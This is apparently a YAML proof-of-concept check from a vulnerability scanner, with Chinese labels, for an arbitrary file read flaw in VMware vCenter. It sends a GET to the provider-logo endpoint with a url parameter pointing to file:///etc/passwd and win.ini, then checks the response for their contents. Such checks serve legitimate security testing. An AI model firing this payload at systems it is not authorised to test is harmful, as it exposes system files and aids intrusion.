id: poc-yaml-vmware-vcenter-provider-arbitrary-file-read
info:
  name: VMware vCenter 任意文件读取漏洞
  severity: high
  tags:
  - 两高一弱
  - 文件读取
  finger: VMware
  osprey-id: vb_2021_0088
variables:
  v_path: 'file:///etc/passwd

    file:///c://windows/win.ini'
requests:
- method: GET
  path: /ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url={{.v_path}}
  headers:
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:86.0) Gecko/20100101
      Firefox/86.0
    Content-Type: application/x-www-form-urlencoded
  expression: "(\n  contains(body, \"root:\") && contains(body, \"/bin\") ||\n  contains(body,\
    \ \"; for 16-bit app support\")\n) && !contains(body, \"<\")\n"
transport: http
